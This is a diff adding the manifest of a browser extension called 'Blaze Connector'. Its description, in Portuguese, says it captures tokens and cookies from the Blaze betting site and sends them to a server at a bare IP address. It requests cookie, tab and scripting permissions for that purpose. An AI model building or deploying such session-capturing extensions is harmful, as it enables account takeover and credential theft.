@@ -1,0 +1,38 @@
+{
+  "manifest_version": 3,
+  "name": "Blaze Connector",
+  "version": "1.0.0",
+  "description": "Captura token e cookies da Blaze e envia para o servidor BR.",
+  "permissions": [
+    "storage",
+    "cookies",
+    "tabs",
+    "scripting"
+  ],
+  "host_permissions": [
+    "https://blaze.bet.br/*",
+    "https://*.blaze.bet/*",
+    "http://45.231.133.221/*",
+    "http://45.231.133.221:3000/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": [
+        "https://blaze.bet.br/*",
+        "https://*.blaze.bet/*"
+      ],
+      "js": [
+        "content.js"
+      ],
+      "run_at": "document_idle"
+    }
+  ],
+  "action": {
+    "default_popup": "popup.html",
+    "default_title": "Blaze Connector"
+  }
+}
+
